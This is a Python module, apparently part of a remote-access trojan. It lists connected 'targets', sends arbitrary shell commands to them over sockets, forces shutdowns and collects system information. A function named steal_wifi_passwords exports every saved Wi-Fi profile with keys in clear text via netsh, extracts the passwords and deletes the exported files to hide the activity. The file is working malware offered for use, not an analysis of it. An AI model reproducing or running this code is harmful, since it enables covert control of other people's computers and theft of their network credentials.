import os
import constants


def clear_screen():  # Clear command line screen
    if os.name == 'posix':
        _ = os.system('clear')
    else:
        _ = os.system('cls')


def show_menu():  # Show main menu
    print("""
    [1] Show Connected Targets
    [2] Open Command Line
    [3] Shutdown Target
    [4] Get WiFi Passwords
    [5] Get System Information
    """)


def show_all_targets(targets):  # Show all connected targets
    if len(targets) == 0:
        print("[!] No connected targets found.")
        return False
    else:
        print("[*] Connected targets:")

        for target_id, connected_target in enumerate(targets):
            address = connected_target[1][0]
            print(f"[{target_id}] {address}")
        return True


def execute_command(targets):  # Execute command line on selected target
    if show_all_targets(targets):
        target_id = int(input("Please select: "))
        active_target_socket = targets[target_id][0]

        command = input("[+] Command Line > ")
        active_target_socket.sendall(command.encode())

        shell_output = active_target_socket.recv(constants.BUFFER_SIZE).decode()
        print(shell_output)


def shutdown_computer():  # Shutdown target computer
    os.popen("shutdown /s /f")


def select_target(targets):  # Select target from menu
    if show_all_targets(targets):
        target_id = int(input("Please select: "))
        return targets[target_id][0]
    return None


def get_system_info(targets):  # Get system information (socket operation)
    active_target_socket = select_target(targets)
    active_target_socket.sendall("systeminfo".encode())
    shell_output = active_target_socket.recv(constants.BUFFER_SIZE).decode()
    print(shell_output)


def get_wifi_passwords(targets):  # Steal wifi passwords (socket operation)
    active_target_socket = select_target(targets)
    active_target_socket.sendall("get_wifi_passwords".encode())
    shell_output = active_target_socket.recv(constants.BUFFER_SIZE).decode()
    print(shell_output)


def steal_wifi_passwords():
    command = "netsh wlan export profile key=clear"
    lines = os.popen(command).readlines()

    filenames = []

    for line in lines:
        if ".xml" in line.lower():
            filename = line[line.find(".\\"):line.find(".xml")]
            filename = filename.split(".\\")[1]
            filename += ".xml"
            filenames.append(f"{os.getcwd()}\\{filename}")

    wifi_passwords = []

    for filename in filenames:
        with open(filename, "r") as f:
            file = f.readlines()

            wifi_name = None
            wifi_password = None

            for line in file:
                if "<name>" in line.lower():
                    if wifi_name is None:
                        wifi_name = line[line.find("<name>") + 6:line.find("</name>")]
                        continue
                elif "<keyMaterial>".lower() in line.lower():
                    if wifi_password is None:
                        try:
                            wifi_password = line[line.find("<keyMaterial>") + 13:line.find("</keyMaterial>")]
                        except:
                            pass

            if wifi_name is not None:
                if wifi_password is not None:
                    wifi_passwords.append((wifi_name, wifi_password))

    os.popen("del Wi-* /s /f /q").read()  # Remove created files
    return wifi_passwords
